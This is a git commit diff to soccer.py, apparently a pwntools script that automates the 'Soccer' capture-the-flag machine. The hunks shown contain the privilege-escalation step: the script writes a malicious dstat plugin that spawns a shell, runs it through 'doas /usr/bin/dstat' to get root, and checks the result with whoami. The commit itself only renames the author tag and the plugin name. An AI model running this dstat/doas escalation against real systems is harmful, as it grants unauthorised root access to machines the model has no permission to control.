01750b370a2fe675c458f6cafbba59bcf0ff6ecf
ninh.pn1337 <ninh.pn1337@gmail.com>
2023-02-24 16:18:46 +0700

    Update soccer.py

--- Soccer/soccer.py
+++ Soccer/soccer.py
@@ -4,7 +4,7 @@ import requests
 
 try:
     from pwn import *
-    print("\n[\033[1;32m+\033[1;37m] Soccer - Ninhpn\n")
+    print("\n[\033[1;32m+\033[1;37m] Soccer - Ninhpn1337\n")
 except:
     print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
     exit(1)
@@ -19,7 +19,9 @@ shell.sendline(b"echo 'import os' > file.txt")
 time.sleep(0.5)
 shell.sendline(b"echo 'os.system(\"sh\")' >> file.txt")
 time.sleep(0.5)
-shell.sendline(b"mv file.txt dstat_hominido.py")
+shell.sendline(b"mv file.txt dstat_ninhpn1337.py")
 time.sleep(0.5)
-shell.sendline(b"doas /usr/bin/dstat --hominido")
+shell.sendline(b"doas /usr/bin/dstat --ninhpn1337")
+time.sleep(0.5)
+shell.sendline(b"whoami")
 shell.interactive()
